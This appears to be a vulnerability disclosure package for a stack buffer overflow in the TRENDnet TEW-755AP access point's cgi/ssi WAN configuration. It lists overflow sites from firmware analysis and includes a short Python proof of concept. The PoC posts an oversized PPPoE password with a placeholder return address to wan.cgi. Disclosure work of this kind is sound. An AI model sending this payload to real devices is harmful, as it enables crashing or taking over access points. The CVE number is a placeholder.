# Technical Report: CVE-XXXX-XXXX: TEW-755AP cgi/ssi WAN Config Stack Overflow

## Normalized Submission Metadata

| Field | Value |
|---|---|
| Vendor | TRENDnet |
| Product | TRENDnet TEW-755AP Access Point |
| Firmware / Version | version per source report |
| Affected Component | cgi/ssi |
| Vulnerability Type | Stack-based Buffer Overflow / RCE |
| CWE | CWE-121 |
| CVSS | 9.8 Critical |
| Source Material | E:\competition\漏洞\vulns\vulns\vuln-755ap-ssi-stackoverflow |

## Executive Summary

The team-provided report describes a CVE-level vulnerability in TRENDnet TEW-755AP Access Point affecting cgi/ssi. The issue is categorized as Stack-based Buffer Overflow / RCE and is supported by the copied PoC and evidence files in this package.

## Original Technical Detail

The original report is embedded below for reviewer convenience. The untouched copy is also available at source/REPORT.original.md.

---

# CVE-XXXX-XXXX: TEW-755AP cgi/ssi WAN Config Stack Overflow

| 厂商 TRENDnet | 产品 TEW-755AP v1.1.07b07 | CWE-121 | CVSS **9.8** |

## FirmRec 验证

```
0x435070: frame=48B  $ra@sp+44 — getenv("reboot_type") → strcpy() ★
0x43CC98: frame=304B $ra@sp+300 — safe_getenv("cameo.wan.wan_pppoe_password_00") → sprintf()
0x43D6C4: frame=312B $ra@sp+308 — safe_getenv("cameo.wan.wan_pptp_password") → sprintf()
0x43EA6C: frame=312B $ra@sp+308 — safe_getenv("cameo.wan.wan_l2tp_password") → sprintf()
0x48AB90: frame=88B  $ra@sp+84 — query_vars("wan0_proto") → strcat()
```

**16 个栈溢出点**（含 safe_getenv 的 sprintf 溢出和 _system 命令注入混合）。Simexp: 374 日志全中 0x41414141。

## PoC
```python
import requests, struct
PAYLOAD = b"A"*68 + struct.pack(">I", 0x41414141)
# PPPoE 密码溢出
requests.post("http://TEW-755AP/cgi-bin/wan.cgi", data={
    "wan_type":"pppoe",
    "cameo.wan.wan_pppoe_password_00":PAYLOAD.decode("latin-1")})
```

